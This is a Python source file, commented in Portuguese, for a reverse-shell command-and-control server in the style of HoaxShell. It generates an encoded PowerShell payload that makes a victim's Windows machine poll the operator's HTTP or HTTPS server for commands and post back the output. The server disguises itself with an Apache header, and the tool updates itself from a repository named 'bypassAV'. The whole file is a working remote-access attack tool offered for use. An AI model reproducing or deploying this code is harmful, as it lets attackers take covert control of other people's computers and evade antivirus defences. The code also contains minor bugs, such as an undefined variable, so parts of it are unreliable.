#!/bin/python3





from http.server import HTTPServer, BaseHTTPRequestHandler

import ssl, sys, argparse, base64, readline, uuid, re

from os import system, path

from warnings import filterwarnings

from datetime import date, datetime

from IPython.display import display

from threading import Thread, Event

from time import sleep

from ipaddress import ip_address

from subprocess import check_output



filterwarnings("ignore", category = DeprecationWarning)



''' Colors '''

MAIN = '\033[38;5;50m'

PLOAD = '\033[38;5;119m'

GREEN = '\033[38;5;47m'

BLUE = '\033[0;38;5;12m'

ORANGE = '\033[0;38;5;214m'

RED = '\033[1;31m'

END = '\033[0m'

BOLD = '\033[1m'





''' MSG Prefixes '''

INFO = f'{MAIN}Info{END}'

WARN = f'{ORANGE}Warning{END}'

IMPORTANT = WARN = f'{ORANGE}Important{END}'

FAILED = f'{RED}Fail{END}'

DEBUG = f'{ORANGE}Debug{END}'



# -------------- Argumentos e Uso -------------- #

parser = argparse.ArgumentParser(

	formatter_class=argparse.RawTextHelpFormatter,

	epilog='''

Usage examples:



 Sessão de shell básica http:



      sudo python3 Shell.py -s <seu ip>



  Conexão de shell criptografada(https):



      openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

      sudo python3 script.py -s <your_ip> -c </Diretorio/cert.pem> -k </Diretorio/key.pem>



'''

	)



parser.add_argument("-s", "--server-ip", action="store", help = "insira o endereço IP do seu servidor")

parser.add_argument("-c", "--certfile", action="store", help = "Caminho para o seu certificado SSL.")

parser.add_argument("-k", "--keyfile", action="store", help = "PCaminho para a chave privada do seu certificado. ")

parser.add_argument("-p", "--port", action="store", help = "A porta do seu servidor (padrão: 8080 sobre http, 443 sobre https)", type = int)

parser.add_argument("-f", "--frequency", action="store", help = "Frequência do ciclo da fila de execução do cmd (Um valor baixo cria um shell mais rápido, mas produz mais tráfego http. *Menos de 0,8 causará problemas default: 0.8s)", type = float)

parser.add_argument("-r", "--raw-payload", action="store_true", help = "Gere payload bruto em vez de codificado em base64")

parser.add_argument("-g", "--grab", action="store_true", help = "Tentativas de restaurar uma sessão ao vivo(Default: false)")

parser.add_argument("-u", "--update", action="store_true", help = "Extraia a versão mais recente do repositório original")

parser.add_argument("-q", "--quiet", action="store_true", help = "Não imprima o banner na inicialização")



args = parser.parse_args()





def exit_with_msg(msg):

	print(f"[{DEBUG}] {msg}")

	sys.exit(0)





# Check if port is valid.

if args.port:

	if args.port < 1 or args.port > 65535:

		exit_with_msg('Port number is not valid.')



# Check if both cert and key files were provided

if (args.certfile and not args.keyfile) or (args.keyfile and not args.certfile):

	exit_with_msg('Falha ao reiniciar https. Chave ou arquivo de certificado ausente (verifique -h para obter mais detalhes).')



ssl_support = True if args.certfile and args.keyfile else False



# -------------- Funções Gerais -------------- #

def print_banner():



	padding = '  '



	H = [[' ', '┐', ' ', '┌'], [' ', '├','╫','┤'], [' ', '┘',' ','└']]

	O =	[[' ', '┌','─','┐'], [' ', '│',' ','│'], [' ', '└','─','┘']]

	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]

	X = [[' ', '─','┐',' ','┬'], [' ', '┌','┴','┬', '┘'], [' ', '┴',' ','└','─']]

	S = [[' ', '┌','─','┐'], [' ', '└','─','┐'], [' ', '└','─','┘']]

	H = [[' ', '┬',' ','┬'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]

	E = [[' ', '┌','─','┐'], [' ', '├','┤',' '], [' ', '└','─','┘']]

	L = [[' ', '┬',' ',' '], [' ', '│',' ', ' '], [' ', '┴','─','┘']]



	banner = [S,H,E,L,L,H,E,L,L]

	final = []

	print('\r')

	init_color = 36

	txt_color = init_color

	cl = 0



	for charset in range(0, 3):

		for pos in range(0, len(banner)):

			for i in range(0, len(banner[pos][charset])):

				clr = f'\033[38;5;{txt_color}m'

				char = f'{clr}{banner[pos][charset][i]}'

				final.append(char)

				cl += 1

				txt_color = txt_color + 36 if cl <= 3 else txt_color



			cl = 0



			txt_color = init_color

		init_color += 31



		if charset < 2: final.append('\n   ')



	print(f"   {''.join(final)}")

	print(f'{END}{padding}                         by :)\n')







def promptHelpMsg():

	print(

	'''

	\r  Command                    Description

	\r  -------                    -----------

	\r  help                       Mostrar mensagem.

	\r  payload                    Mostrar payload novamente em (base64).

	\r  rawpayload                 Mostrar payload novamente em  (raw).

	\r  clear                      Limpar a tela.

	\r  exit/quit/q                Fechar sessão e sair.

	''')







def encodePayload(payload):

	enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

	print(f'{PLOAD}{enc_payload}{END}')







def is_valid_uuid(value):



    try:

        uuid.UUID(str(value))

        return True



    except ValueError:

        return False







def checkPulse(stop_event):



	while not stop_event.is_set():



		timestamp = int(datetime.now().timestamp())

		tlimit = frequency + 10



		if Shell.execution_verified:

			if abs(Shell.last_received - timestamp) > tlimit:

				print(f'\r[{WARN}] A sessão ficou inativa por mais de {tlimit} segundos. Shell provavelmente morreu.')

				Shell.prompt_ready = True

				stop_event.set()



		sleep(5)







def chill():

	pass





# ------------------ configurações------------------ #

prompt = "shell > "

quiet = True if args.quiet else False

frequency = args.frequency if args.frequency else 0.8

stop_event = Event()



def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):



	if Shell.rst_promt_required or force_rst:

		sys.stdout.write(prefix + prompt + readline.get_line_buffer())

		Shell.rst_promt_required = False





# -------------- Shell Server -------------- #

class Shell(BaseHTTPRequestHandler):



	restored = False

	rst_promt_required = False

	prompt_ready = True

	command_pool = []

	execution_verified = False

	last_received = ''

	verify = str(uuid.uuid4()).replace("-", "")[0:8]

	get_cmd = str(uuid.uuid4()).replace("-", "")[0:8]

	post_res = str(uuid.uuid4()).replace("-", "")[0:8]

	hid = str(uuid.uuid4()).split("-")

	header_id = f'{hid[0][0:4]}-{hid[1]}'

	SESSIONID = '-'.join([verify, get_cmd, post_res])





	def do_GET(self):



		timestamp = int(datetime.now().timestamp())

		Shell.last_received = timestamp



		if args.grab and not Shell.restored:

			header_id = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]

			Shell.header_id = header_id[0]

			session_id = self.headers.get(f'X-{Shell.header_id}')

			if len(session_id) == 26:

				h = session_id.split('-')

				Shell.verify = h[0]

				Shell.get_cmd = h[1]

				Shell.post_res = h[2]

				Shell.SESSIONID = session_id

				Shell.restored = True

				Shell.execution_verified = True

				session_check = Thread(target = checkPulse, args = (stop_event,))

				session_check.daemon = True

				session_check.start()



				print(f'\r[{GREEN}Shell{END}] {BOLD}Sessão restaurada!{END}')

				rst_prompt(force_rst = True)



		self.server_version = "Apache/2.4.1"

		self.sys_version = ""

		session_id = self.headers.get(f'X-{Shell.header_id}')

		legit = True if session_id == Shell.SESSIONID else False



		# Verificação de Execução

		if self.path == f'/{Shell.verify}' and legit:



			self.send_response(200)

			self.send_header('Content-type', 'text/javascript; charset=UTF-8')

			self.send_header('Access-Control-Allow-Origin', '*')

			self.end_headers()

			self.wfile.write(bytes('OK', "utf-8"))

			Shell.execution_verified = True

			session_check = Thread(target = checkPulse, args = (stop_event,))

			session_check.daemon = True

			session_check.start()

			print(f'\r[{GREEN}Shell{END}] {BOLD}Payload execução verificada!{END}')

			print(f'\r[{GREEN}Shell{END}] {BOLD}Estabilizando o prompt de comando...{END}', end = '')

			Shell.prompt_ready = False

			Shell.command_pool.append("split-path $pwd'\\0x00'")

			Shell.rst_promt_required = True





		# Grab cmd

		if self.path == f'/{Shell.get_cmd}' and legit and Shell.execution_verified:



			self.send_response(200)

			self.send_header('Content-type', 'text/javascript; charset=UTF-8')

			self.send_header('Access-Control-Allow-Origin', '*')

			self.end_headers()



			if len(Shell.command_pool):

				cmd = Shell.command_pool.pop(0)

				self.wfile.write(bytes(cmd, "utf-8"))



			else:

				self.wfile.write(bytes('None', "utf-8"))



			Shell.last_received = timestamp



		else:

			self.send_response(200)

			self.end_headers()

			self.wfile.write(b'ok.')

			pass







	def do_POST(self):

		global prompt

		timestamp = int(datetime.now().timestamp())

		Shell.last_received = timestamp

		self.server_version = "Apache/2.4.1"

		self.sys_version = ""

		session_id = self.headers.get(f'X-{Shell.header_id}')

		legit = True if session_id == Shell.SESSIONID else False



		# saída cmd

		if self.path == f'/{Shell.post_res}' and legit and Shell.execution_verified:



			self.send_response(200)

			self.send_header('Access-Control-Allow-Origin', '*')

			self.send_header('Content-Type', 'text/plain')

			self.end_headers()

			self.wfile.write(b'OK')

			script = self.headers.get('X-form-script')

			content_len = int(self.headers.get('Content-Length'))

			output = self.rfile.read(content_len)



			if output:

				try:

					bin_output = output.decode('utf-8').split(' ')

					to_b_numbers = [ int(n) for n in bin_output ]

					b_array = bytearray(to_b_numbers)

					output = b_array.decode('utf-8', 'ignore')

					prompt = f"PS {' '.join(output.split()[-1::])}> "



				except UnicodeDecodeError:

					print(f'[{WARN}] Falha na decodificação de dados para UTF-8. Imprimindo dados brutos.')



				if isinstance(output, bytes):

					pass



				else:

					output = output.strip()[:-(len(prompt)-4)] + '\n' if output.strip() != '' else output.strip()



				print(f'\r{GREEN}{output}{END}')

			else:

				print(f'\r{ORANGE}No output.{END}')



			rst_prompt(prompt = prompt)

			Shell.prompt_ready = True



		else:

			self.send_response(200)

			self.end_headers()

			self.wfile.write(b'ok.')

			pass







	def do_OPTIONS(self):



		self.server_version = "Apache/2.4.1"

		self.sys_version = ""

		self.send_response(200)

		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])

		self.send_header('Vary', "Origin")

		self.send_header('Access-Control-Allow-Credentials', 'true')

		self.send_header('Access-Control-Allow-Headers', f'X-{Shell.header_id}')

		self.end_headers()

		self.wfile.write(b'OK')





	def log_message(self, format, *args):

		return





	def dropSession():



		print(f'\r[{WARN}] Fechando a sessão com elegância...')

		Shell.command_pool.append('exit')

		sleep(frequency + 2.0)

		print(f'[{WARN}] Sessão encerrada.')

		stop_event.set()

		sys.exit(0)





	def terminate():



			if Shell.execution_verified:

				Shell.dropSession()



			else:

				print(f'\r[{WARN}] Sessão encerrada.')

				stop_event.set()

				sys.exit(0)







def main():



	try:

		chill() if quiet else print_banner()



		# Utilitário de atualização

		if args.update:



			updated = False



			try:

				cwd = path.dirname(path.abspath(__file__))

				print(f'[{INFO}] Extraindo alterações do branch master...')

				u = check_output(f'cd {cwd}&&git pull https://github.com/NceiifadoR/bypassAV main', shell=True).decode('utf-8')



				if re.search('Updating', u):

					print(f'[{INFO}] Atualização completa! Por favor, reinicie.')

					updated = True



				elif re.search('atualizado', u):

					print(f'[{INFO}] Já está executando a versão mais recente!')

					pass



				else:

					print(f'[{FAILED}] Algo deu errado. Você está executando no seu repositório git local?')

					print(f'[{DEBUG}] Considere rodar "git pull https://github.com/NceiifadoR/bypassAV  main" Dentro do projeto\'s Diretorio.')



			except:

				print(f'[{FAILED}] Atualização falhou. Considere Rodar"git pull https://github.com/NceiifadoR/bypassAV  main" Dentro do projeto\'s Diretorio.')



			if updated:

				sys.exit(0)





		if not args.server_ip and args.update and len(sys.argv) == 2:

			sys.exit(0)



		if not args.server_ip and args.update and len(sys.argv) > 2:

			exit_with_msg('Local host ip not provided (-s)')



		elif not args.server_ip and not args.update:

			exit_with_msg('Local host ip not provided (-s)')



		else:

			# Verifique se o ip fornecido é válido

			try:

				ip_object = ip_address(args.server_ip)



			except ValueError:

				exit_with_msg('Endereço Ip não é valido.')





		if ssl_support:

			server_port = int(args.port) if args.port else 443

		else:

			server_port = int(args.port) if args.port else 8080



		try:

			httpd = HTTPServer(('0.0.0.0', server_port), Shell)



		except OSError:

			exit(f'\n[{FAILED}] - {BOLD}Port {server_port} parece já estar em uso.{END}\n')



		if ssl_support:

			httpd.socket = ssl.wrap_socket (

				httpd.socket,

				keyfile = args.keyfile ,

				certfile = args.certfile ,

				server_side = True,

				ssl_version=ssl.PROTOCOL_TLS

			)



		port = f':{server_port}' if server_port != 443 else ''



		Shell_server = Thread(target = httpd.serve_forever, args = ())

		Shell_server.daemon = True

		Shell_server.start()





		# Gerar a carga

		if not args.grab:

			print(f'[{INFO}] Gerando carga útil do shell reverso...')

			source = open(f'./https_payload.ps1', 'r') if  ssl_support else open(f'./http_payload.ps1', 'r')

			payload = source.read().strip()

			source.close()

			payload = payload.replace('*SERVERIP*', f'{args.server_ip}:{server_port}').replace('*SESSIONID*', Shell.SESSIONID).replace('*FREQ*', str(frequency)).replace('*VERIFY*', Shell.verify).replace('*GETCMD*', Shell.get_cmd).replace('*POSTRES*', Shell.post_res).replace('*HOAXID*', Shell.header_id)

			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')



			print(f'[{INFO}] Digite "help" para obter uma lista dos comandos de prompt disponíveis.')

			print(f'[{INFO}] Servidor Https iniciado na porta {server_port}. ') if ssl_support else print(f'[{INFO}] Servidor HTTP iniciado na porta {server_port}.')

			print(f'[{IMPORTANT}] {BOLD} Aguardando a execução da carga útil para iniciar a sessão do shell... {END}')



		else:

			print(f'\r[{IMPORTANTE}] Tentando restaurar a sessão. Ouvindo o trafico...')





		# Prompt de comando

		while True:



			if Shell.prompt_ready:



				user_input = input(prompt).strip()



				if user_input.lower() == 'help':

					promptHelpMsg()



				elif user_input.lower() in ['clear']:

					system('clear')



				elif user_input.lower() in ['payload']:

					encodePayload(payload)



				elif user_input.lower() in ['rawpayload']:

					print(f'{PLOAD}{payload}{END}')



				elif user_input.lower() in ['exit', 'quit', 'q']:

					Shell.terminate()



				elif user_input == '':

					rst_prompt(force_rst = True, prompt = '\r')



				else:



					if Shell.execution_verified and not Shell.command_pool:

						Shell.command_pool.append(user_input + ";split-path $pwd'\\0x00'")

						Shell.prompt_ready = False



					elif Shell.execution_verified and Shell.command_pool:

						pass



					else:

						print(f'\r[{INFO}] Nenhuma sessão ativa.')

			# ~ else:

				# ~ sleep(0.5)





	except KeyboardInterrupt:

		Shell.terminate()





if __name__ == '__main__':

	main()

